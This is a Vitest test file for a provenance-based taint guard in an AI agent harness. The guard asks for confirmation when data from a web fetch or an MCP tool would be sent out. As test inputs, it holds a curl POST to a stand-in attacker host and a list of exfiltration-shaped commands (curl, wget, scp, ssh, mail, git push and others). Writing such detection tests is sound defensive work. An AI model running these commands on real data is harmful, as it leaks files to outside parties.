// ===========================================
// Provenance Axis on TaintSource (item-1 rollout)
// ===========================================
//
// Pins three surfaces of the new provenance axis:
//   1. `classifyProvenance(toolName, filePath)` returns the correct
//      provenance for each canonical input shape (WebFetch, MCP,
//      doc-shaped Read, code-shaped Read, UserPromptSubmit, fallback).
//   2. `checkProvenanceTaintToExternalAction` returns `decision: "ask"`
//      when an external-action tool would consume an untrusted-provenance
//      source path, and null otherwise.
//   3. `SessionTracker.serialize`/`hydrate` round-trip the provenance
//      field, defaulting to "local_read" for pre-provenance snapshots.

import { describe, expect, it } from "vitest";
import type { JsonObject } from "../../lib/json-types.js";
import { nonNull } from "../../lib/non-null.js";
import { checkProvenanceTaintToExternalAction } from "../evaluator/taint-guards.js";
import { SessionTracker } from "../session-state.js";
import {
	classifyProvenance,
	DEFAULT_TAINT_CONFIG,
	ratchetSensitivity,
} from "../taint-tracker.js";
import type { SessionTrajectory, TaintProvenance, TaintSource } from "../types.js";

const FIXED_NOW = 1_700_000_000_000;
const FIXED_TIMESTAMP = new Date(FIXED_NOW).toISOString();

function makeSession(overrides: Partial<SessionTrajectory> = {}): SessionTrajectory {
	return {
		session_id: "prov-test",
		agent_name: "test-agent",
		started_at: FIXED_TIMESTAMP,
		tool_call_count: 0,
		error_count: 0,
		files_read: new Set(),
		files_written: new Set(),
		commands_run: [],
		curl_localhost_count: {},
		mcp_tools_used: 0,
		local_tools_used: 0,
		file_write_times: new Map(),
		failed_files: new Map(),
		pending_completions: new Map(),
		file_read_at: new Map(),
		tool_sequence: [],
		sensitivity_level: "Public",
		taint_sources: [],
		step_limit: Number.POSITIVE_INFINITY,
		consecutive_pattern: null,
		suggested_permissions: new Set(),
		acknowledged_checks: new Set(),
		fired_reminders: new Set(),
		soft_blocks: new Set(),
		injection_detected_steps: [],
		pii_detected_steps: [],
		last_coordination_at: 0,
		last_coordination_ts: FIXED_NOW,
		test_runs: new Map(),
		file_edit_counts: new Map(),
		warnings_issued: new Map(),
		tdd_cycles: new Map(),
		consecutive_tool_failures: new Map(),
		silent_failure_warned: new Set(),
		bloat_warned: new Set(),
		assertion_counts: new Map(),
		...overrides,
	};
}

function makeTaintSource(overrides: Partial<TaintSource> & { file: string }): TaintSource {
	return {
		level: "Confidential",
		at_step: 1,
		provenance: "local_read",
		...overrides,
	};
}

describe("classifyProvenance — provenance classification", () => {
	it("classifies WebFetch tool as fetched_external", () => {
		expect(classifyProvenance("WebFetch", "<WebFetch-response>")).toBe("fetched_external");
		expect(classifyProvenance("web_fetch", "anything")).toBe("fetched_external");
		expect(classifyProvenance("WebSearch", "")).toBe("fetched_external");
	});

	it("classifies mcp__* tool name as mcp_remote", () => {
		expect(classifyProvenance("mcp__github__list_issues", "<mcp-response>")).toBe(
			"mcp_remote",
		);
		expect(
			classifyProvenance("mcp__claude_ai_Gmail__authenticate", "<mcp-response>"),
		).toBe("mcp_remote");
	});

	it("classifies Read of a .md doc file as document_content", () => {
		expect(classifyProvenance("Read", "README.md")).toBe("document_content");
		expect(classifyProvenance("Read", "/abs/path/CHANGELOG.md")).toBe("document_content");
		expect(classifyProvenance("Read", "docs/spec.rst")).toBe("document_content");
		expect(classifyProvenance("Read", "manual.pdf")).toBe("document_content");
		expect(classifyProvenance("Read", "notes.txt")).toBe("document_content");
		expect(classifyProvenance("Read", "guide.adoc")).toBe("document_content");
	});

	it("classifies Read of a .ts/.py source file as local_read", () => {
		expect(classifyProvenance("Read", "src/foo.ts")).toBe("local_read");
		expect(classifyProvenance("Read", "src/foo.tsx")).toBe("local_read");
		expect(classifyProvenance("Read", "script.py")).toBe("local_read");
		expect(classifyProvenance("Read", "main.go")).toBe("local_read");
		expect(classifyProvenance("Read", "lib.rs")).toBe("local_read");
	});

	it("classifies UserPromptSubmit body as user_provided", () => {
		expect(classifyProvenance("UserPromptSubmit", "")).toBe("user_provided");
		expect(classifyProvenance("UserPromptSubmit", "anything")).toBe("user_provided");
	});

	it("falls back to local_read for unmatched tools/extensions", () => {
		expect(classifyProvenance("Bash", "")).toBe("local_read");
		expect(classifyProvenance("Read", "weirdfile.xyz")).toBe("local_read");
		expect(classifyProvenance(undefined, "noext")).toBe("local_read");
		expect(classifyProvenance("Read", "")).toBe("local_read");
	});

	it("parses bracketed pseudo-filepaths for callers that don't thread toolName", () => {
		// content-scanner/post-scan.ts attributes taint to `<WebFetch-response>`
		// etc. without passing toolName through to ratchetSensitivity.
		expect(classifyProvenance(undefined, "<WebFetch-response>")).toBe("fetched_external");
		expect(classifyProvenance(undefined, "<mcp__github__list_issues-response>")).toBe(
			"mcp_remote",
		);
		expect(classifyProvenance(undefined, "<UserPromptSubmit-redacted>")).toBe(
			"user_provided",
		);
		expect(classifyProvenance(undefined, "<command-output>")).toBe("local_read");
	});
});

describe("ratchetSensitivity — provenance field populated", () => {
	it("records explicit provenance when caller passes it", () => {
		const session = makeSession();
		const changed = ratchetSensitivity(
			session,
			"<WebFetch-response>",
			"Confidential",
			DEFAULT_TAINT_CONFIG,
			"fetched_external",
		);
		expect(changed).toBe(true);
		expect(session.taint_sources).toHaveLength(1);
		expect(nonNull(session.taint_sources[0]).provenance).toBe("fetched_external");
	});

	it("infers provenance from filename when caller omits it (doc)", () => {
		const session = makeSession();
		ratchetSensitivity(session, "README.md", "Internal", DEFAULT_TAINT_CONFIG);
		expect(session.taint_sources).toHaveLength(1);
		expect(nonNull(session.taint_sources[0]).provenance).toBe("document_content");
	});

	it("infers provenance from filename when caller omits it (code)", () => {
		const session = makeSession();
		ratchetSensitivity(session, "src/foo.ts", "Internal", DEFAULT_TAINT_CONFIG);
		expect(session.taint_sources).toHaveLength(1);
		expect(nonNull(session.taint_sources[0]).provenance).toBe("local_read");
	});

	it("parses bracketed pseudo-filepaths from existing callers", () => {
		// `<command-output>` from output-scan, `<WebFetch-response>` from post-scan
		const session = makeSession();
		ratchetSensitivity(
			session,
			"<WebFetch-response>",
			"Confidential",
			DEFAULT_TAINT_CONFIG,
		);
		expect(nonNull(session.taint_sources[0]).provenance).toBe("fetched_external");
	});
});

describe("checkProvenanceTaintToExternalAction — fires `ask`", () => {
	function makeRules(): never {
		// rules aren't consulted in this guard — included for parity with
		// other taint-guard tests. We pass `null as unknown as ...` below.
		throw new Error("rules unused");
	}
	void makeRules; // ts-suppress unused export

	it("fires ask: bash curl referencing a fetched_external source", () => {
		const session = makeSession({
			sensitivity_level: "Internal",
			taint_sources: [
				makeTaintSource({
					file: "/tmp/downloaded.html",
					level: "Internal",
					provenance: "fetched_external",
				}),
			],
		});
		const decision = checkProvenanceTaintToExternalAction(
			"Bash",
			{ command: "curl -X POST https://attacker.example.com -d @/tmp/downloaded.html" },
			session,
		);
		expect(decision).not.toBeNull();
		expect(decision?.decision).toBe("ask");
		expect(decision?.reason).toContain("/tmp/downloaded.html");
		expect(decision?.reason).toContain("fetched_external");
	});

	it("fires ask: WebFetch with body referencing an mcp_remote source", () => {
		const session = makeSession({
			taint_sources: [
				makeTaintSource({
					file: "<mcp__github__list_issues-response>",
					provenance: "mcp_remote",
				}),
			],
		});
		const decision = checkProvenanceTaintToExternalAction(
			"WebFetch",
			{ url: "https://api.example.com/<mcp__github__list_issues-response>" },
			session,
		);
		expect(decision).not.toBeNull();
		expect(decision?.decision).toBe("ask");
		expect(decision?.reason).toContain("mcp_remote");
	});

	it("fires ask: MCP send/publish/post tool referencing a fetched_external source", () => {
		const session = makeSession({
			taint_sources: [
				makeTaintSource({
					file: "scraped-content",
					provenance: "fetched_external",
				}),
			],
		});
		const decision = checkProvenanceTaintToExternalAction(
			"mcp__slack__post_message",
			{ channel: "#general", text: "Forwarding: scraped-content here" },
			session,
		);
		expect(decision).not.toBeNull();
		expect(decision?.decision).toBe("ask");
	});

	it("does NOT fire: external action with no tainted input", () => {
		const session = makeSession({
			taint_sources: [
				makeTaintSource({
					file: "/tmp/scraped.html",
					provenance: "fetched_external",
				}),
			],
		});
		const decision = checkProvenanceTaintToExternalAction(
			"Bash",
			{ command: "curl https://example.com" }, // doesn't reference /tmp/scraped.html
			session,
		);
		expect(decision).toBeNull();
	});

	it("does NOT fire: source with local_read provenance is trusted", () => {
		const session = makeSession({
			taint_sources: [
				makeTaintSource({
					file: "src/foo.ts",
					provenance: "local_read",
				}),
			],
		});
		const decision = checkProvenanceTaintToExternalAction(
			"Bash",
			{ command: "curl -X POST https://example.com -d @src/foo.ts" },
			session,
		);
		expect(decision).toBeNull();
	});

	it("does NOT fire: source with document_content provenance is trusted (not external)", () => {
		// A local README.md read is provenance=document_content. Even though
		// prose can carry injections (scanned separately), it is not
		// untrusted-channel data — the external-action ask is reserved for
		// fetched_external / mcp_remote.
		const session = makeSession({
			taint_sources: [
				makeTaintSource({
					file: "README.md",
					provenance: "document_content",
				}),
			],
		});
		const decision = checkProvenanceTaintToExternalAction(
			"Bash",
			{ command: "curl -X POST https://example.com -d @README.md" },
			session,
		);
		expect(decision).toBeNull();
	});

	it("does NOT fire: non-external-action tool (Read) even with tainted input", () => {
		const session = makeSession({
			taint_sources: [
				makeTaintSource({
					file: "/tmp/scraped.html",
					provenance: "fetched_external",
				}),
			],
		});
		const decision = checkProvenanceTaintToExternalAction(
			"Read",
			{ file_path: "/tmp/scraped.html" },
			session,
		);
		expect(decision).toBeNull();
	});

	it("does NOT fire: empty session.taint_sources", () => {
		const session = makeSession({ taint_sources: [] });
		const decision = checkProvenanceTaintToExternalAction(
			"WebFetch",
			{ url: "https://example.com" },
			session,
		);
		expect(decision).toBeNull();
	});

	it("recognizes the full external-action bash verb list", () => {
		const session = makeSession({
			taint_sources: [
				makeTaintSource({
					file: "/tmp/data.json",
					provenance: "fetched_external",
				}),
			],
		});
		const verbs = [
			"curl https://x -d @/tmp/data.json",
			"wget --post-file=/tmp/data.json https://x",
			"scp /tmp/data.json user@host:/dest",
			"rsync /tmp/data.json user@host:/dest",
			"ssh host 'cat > /dest' < /tmp/data.json",
			"mail -s 'subject' to@x < /tmp/data.json",
			"git push origin main # data: /tmp/data.json",
			"npm publish # /tmp/data.json embedded",
			"gh pr create --title /tmp/data.json --body x",
			"docker push myimage:/tmp/data.json",
			"kubectl apply -f /tmp/data.json",
			"terraform apply -var-file=/tmp/data.json",
		];
		for (const cmd of verbs) {
			const decision = checkProvenanceTaintToExternalAction("Bash", { command: cmd }, session);
			expect(decision?.decision, `verb: ${cmd}`).toBe("ask");
		}
	});

	it("recognizes MCP external-action verbs (send/publish/deploy/push/email/post)", () => {
		const session = makeSession({
			taint_sources: [
				makeTaintSource({ file: "leaked.txt", provenance: "fetched_external" }),
			],
		});
		const tools = [
			"mcp__slack__send_message",
			"mcp__npm__publish_package",
			"mcp__cloudflare__deploy_worker",
			"mcp__git__push_branch",
			"mcp__resend__email_send",
			"mcp__github__create_pull_request",
			"mcp__discord__post_message",
		];
		for (const t of tools) {
			const decision = checkProvenanceTaintToExternalAction(
				t,
				{ payload: "see leaked.txt" },
				session,
			);
			expect(decision?.decision, `tool: ${t}`).toBe("ask");
		}
	});

	it("does NOT fire on non-external-action MCP tools (read/list/get)", () => {
		const session = makeSession({
			taint_sources: [
				makeTaintSource({ file: "tainted.txt", provenance: "fetched_external" }),
			],
		});
		const decision = checkProvenanceTaintToExternalAction(
			"mcp__github__list_issues",
			{ repo: "tainted.txt" },
			session,
		);
		expect(decision).toBeNull();
	});
});

describe("SessionTracker serialize/hydrate — provenance round-trip", () => {
	it("preserves provenance across serialize -> hydrate", () => {
		const writer = new SessionTracker();
		const session = writer.recordEvent({
			hook_event: "PostToolUse",
			session_id: "rt-prov",
			agent_source: "claude",
			tool_name: "Read",
			tool_input: { file_path: "a.ts" },
			timestamp: FIXED_TIMESTAMP,
		});
		// Manually inject taint sources of every provenance so we round-trip
		// the full domain.
		session.taint_sources = [
			{ file: "f1.md", level: "Internal", at_step: 1, provenance: "document_content" },
			{
				file: "<WebFetch-response>",
				level: "Confidential",
				at_step: 2,
				provenance: "fetched_external",
			},
			{ file: "f2.ts", level: "Public", at_step: 3, provenance: "local_read" },
			{
				file: "<mcp-call>",
				level: "Public",
				at_step: 4,
				provenance: "mcp_remote",
			},
			{ file: "prompt-1", level: "Public", at_step: 5, provenance: "user_provided" },
		];

		const snap = writer.serialize("rt-prov");
		expect(snap).not.toBeNull();

		const reader = new SessionTracker();
		const restored = reader.hydrate(nonNull(snap));
		expect(restored).not.toBeNull();
		expect(restored?.taint_sources).toHaveLength(5);
		const provenances = (nonNull(restored)).taint_sources.map((s) => s.provenance);
		expect(provenances).toEqual([
			"document_content",
			"fetched_external",
			"local_read",
			"mcp_remote",
			"user_provided",
		]);
	});

	it("hydrates older snapshots without provenance field as local_read (no crash)", () => {
		const reader = new SessionTracker();
		// Simulate a snapshot written by a pre-provenance harness — taint_sources
		// entries lack the `provenance` field entirely.
		const oldSnapshot: JsonObject = {
			schema_version: 1,
			session_id: "old-snapshot",
			agent_name: "alice",
			started_at: FIXED_TIMESTAMP,
			tool_call_count: 5,
			error_count: 0,
			taint_sources: [
				{ file: ".env", level: "Confidential", at_step: 2 },
				{ file: "cert.pem", level: "HighlyConfidential", at_step: 4 },
			],
			files_read: [],
			files_written: [],
			commands_run: [],
			tool_sequence: [],
			sensitivity_level: "HighlyConfidential",
			step_limit: 100,
			consecutive_pattern: null,
			last_coordination_at: 0,
			last_coordination_ts: FIXED_NOW,
			curl_localhost_count: {},
			injection_detected_steps: [],
			pii_detected_steps: [],
			suggested_permissions: [],
			acknowledged_checks: [],
			fired_reminders: [],
			soft_blocks: [],
			silent_failure_warned: [],
			bloat_warned: [],
			file_write_times: {},
			file_read_at: {},
			failed_files: {},
			pending_completions: {},
			file_edit_counts: {},
			warnings_issued: {},
			tdd_cycles: {},
			consecutive_tool_failures: {},
			test_runs: {},
			active_skills: {},
		};
		const restored = reader.hydrate(oldSnapshot);
		expect(restored).not.toBeNull();
		expect(restored?.taint_sources).toHaveLength(2);
		const provenances = (nonNull(restored)).taint_sources.map(
			(s) => s.provenance,
		);
		// Backward compat: every entry without provenance defaults to local_read.
		expect(provenances).toEqual<TaintProvenance[]>(["local_read", "local_read"]);
		// Other fields are preserved.
		expect(nonNull(restored?.taint_sources[0]).file).toBe(".env");
		expect(nonNull(restored?.taint_sources[0]).level).toBe("Confidential");
		expect(nonNull(restored?.taint_sources[1]).file).toBe("cert.pem");
	});

	it("coerces malformed provenance values to local_read on hydrate", () => {
		const reader = new SessionTracker();
		const snapshot: JsonObject = {
			schema_version: 1,
			session_id: "malformed-prov",
			agent_name: "alice",
			started_at: FIXED_TIMESTAMP,
			tool_call_count: 1,
			error_count: 0,
			taint_sources: [
				{
					file: "f.ts",
					level: "Public",
					at_step: 1,
					provenance: "not-a-real-value",
				},
				{ file: "g.md", level: "Public", at_step: 2, provenance: 42 },
			],
			files_read: [],
			files_written: [],
			commands_run: [],
			tool_sequence: [],
			sensitivity_level: "Public",
			step_limit: null,
			consecutive_pattern: null,
			last_coordination_at: 0,
			last_coordination_ts: FIXED_NOW,
			curl_localhost_count: {},
			injection_detected_steps: [],
			pii_detected_steps: [],
			suggested_permissions: [],
			acknowledged_checks: [],
			fired_reminders: [],
			soft_blocks: [],
			silent_failure_warned: [],
			bloat_warned: [],
			file_write_times: {},
			file_read_at: {},
			failed_files: {},
			pending_completions: {},
			file_edit_counts: {},
			warnings_issued: {},
			tdd_cycles: {},
			consecutive_tool_failures: {},
			test_runs: {},
			active_skills: {},
		};
		const restored = reader.hydrate(snapshot);
		expect(restored).not.toBeNull();
		expect(restored?.taint_sources).toHaveLength(2);
		expect(nonNull(restored?.taint_sources[0]).provenance).toBe("local_read");
		expect(nonNull(restored?.taint_sources[1]).provenance).toBe("local_read");
	});
});
